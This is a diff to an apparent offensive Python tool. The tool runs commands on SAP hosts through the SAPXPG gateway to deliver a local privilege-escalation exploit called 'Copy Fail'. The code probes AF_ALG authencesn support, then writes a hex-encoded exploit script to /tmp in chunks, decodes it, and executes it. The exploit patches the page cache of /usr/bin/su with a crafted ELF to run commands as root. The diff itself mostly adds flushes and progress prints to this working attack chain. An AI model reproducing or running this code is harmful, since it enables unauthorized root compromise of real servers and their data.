@@ -225,15 +225,23 @@ def check_copyfail(node) -> dict:
     # Check authencesn via AF_ALG bind using long_params (avoids SAPXPG
     # quoting issues — the code string goes in LONG_PARAMS, not PARAMS).
     # Writes /tmp/.cf_chk if bind succeeds; we read it back to confirm.
+    # explicit flush+close so SAPXPG process termination doesn't
+    # leave the file buffer unflushed (same issue as noted in live testing)
     chk_code = (
         "import socket;"
         "a=socket.socket(38,5,0);"
         "a.bind(('aead','authencesn(hmac(sha256),cbc(aes))'));"
-        "f=open('/tmp/.cf_chk','w');f.write('OK');f.close();"
+        "f=open('/tmp/.cf_chk','w');f.write('OK');f.flush();f.close();"
         "a.close()"
     )
-    execute_gw_command(node, "python3", "-c", long_params=chk_code)
+    r_chk = execute_gw_command(node, "python3", "-c", long_params=chk_code)
+    chk_exec_ok = r_chk.get("success", False)
+    chk_out_raw = "\n".join(r_chk.get("output") or []).strip()
+    print(f"[*] {getattr(node,'sid','?')}: copyfail check — python3 "
+          f"exec ok={chk_exec_ok} out={chk_out_raw[:80]!r}")
     chk_out = _r("cat", "/tmp/.cf_chk")
+    print(f"[*] {getattr(node,'sid','?')}: copyfail check — "
+          f"cf_chk contents={chk_out!r}")
     _r("rm", "-f /tmp/.cf_chk")
     result["authencesn_ok"] = chk_out.strip() == "OK"
     result["details"]["authencesn"] = chk_out
@@ -318,24 +326,40 @@ def run_as_root(node, command: str, timeout: float = 60.0) -> dict:
     script_hex = script.encode().hex()
     chunks = [script_hex[i:i+60] for i in range(0, len(script_hex), 60)]
     print(f"[*] {sid}: Copy Fail — delivering exploit "
-          f"({len(script)} bytes, {len(chunks)} chunks)...")
+          f"({len(script)} bytes as hex, {len(chunks)} SAPXPG calls)...")
 
-    _gw("python3", "-c",
-        lp="f=open('%s','w');f.write('%s');f.close()" % (HEXFILE, chunks[0]))
-    for chunk in chunks[1:]:
-        _gw("python3", "-c",
-            lp="f=open('%s','a');f.write('%s');f.close()" % (HEXFILE, chunk))
+    _, ok0 = _gw("python3", "-c",
+                 lp="f=open('%s','w');f.write('%s');f.flush();f.close()"
+                    % (HEXFILE, chunks[0]))
+    print(f"[*] {sid}: Copy Fail — chunk 1/{len(chunks)} ok={ok0}")
+    for i, chunk in enumerate(chunks[1:], start=2):
+        _, ok_i = _gw("python3", "-c",
+                       lp="f=open('%s','a');f.write('%s');f.flush();f.close()"
+                          % (HEXFILE, chunk))
+        print(f"[*] {sid}: Copy Fail — chunk {i}/{len(chunks)} ok={ok_i}")
+
+    # Verify hex file was written correctly
+    hf_size, _ = _gw("ls", "-la " + HEXFILE)
+    print(f"[*] {sid}: Copy Fail — hex file: {hf_size}")
 
     # Step 2: decode hex → Python script
     dc = ("f=open('%s');d=f.read();f.close();"
           "g=open('%s','wb');g.write(bytes.fromhex(d));g.close()"
           % (HEXFILE, SCRIPT))
-    _gw("python3", "-c", lp=dc)
+    _, dc_ok = _gw("python3", "-c", lp=dc)
     _gw("rm", "-f " + HEXFILE)
+    sf_size, _ = _gw("ls", "-la " + SCRIPT)
+    print(f"[*] {sid}: Copy Fail — script decoded ok={dc_ok}: {sf_size}")
 
-    # Step 3: execute exploit
-    print(f"[*] {sid}: Copy Fail — patching /usr/bin/su page cache + execve...")
-    _gw("python3", SCRIPT)
+    # Step 3: execute exploit (patches /usr/bin/su page cache + fork+execve)
+    elf = _build_elf('/tmp/.cf_run.sh')
+    n_writes = len(elf) // 4
+    print(f"[*] {sid}: Copy Fail — executing exploit: writing "
+          f"{len(elf)}B ELF in {n_writes} page-cache writes to /usr/bin/su...")
+    exploit_out, _ = _gw("python3", SCRIPT)
+    if exploit_out:
+        print(f"[*] {sid}: Copy Fail — exploit stdout: {exploit_out[:200]!r}")
+    print(f"[*] {sid}: Copy Fail — exploit finished, reading result...")
 
     # Step 4: read result
     result_bytes = _read_b64(RESULT)
